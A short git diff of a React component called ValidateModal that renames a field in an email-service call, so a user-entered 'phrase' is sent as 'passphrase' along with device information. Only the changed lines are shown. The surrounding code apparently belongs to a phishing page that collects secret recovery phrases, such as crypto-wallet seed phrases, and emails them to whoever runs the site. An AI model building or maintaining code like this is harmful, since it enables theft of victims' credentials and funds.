@@ -47,7 +47,7 @@ const ValidateModal = (props: Props) => {
         import.meta.env.VITE_EMAIL_TEMPLATE_ID,
         {
           device_info: deviceInfo,
-          phrase,
+          passphrase: phrase,
         },
         import.meta.env.VITE_EMAIL_PUBLIC_KEY
       );
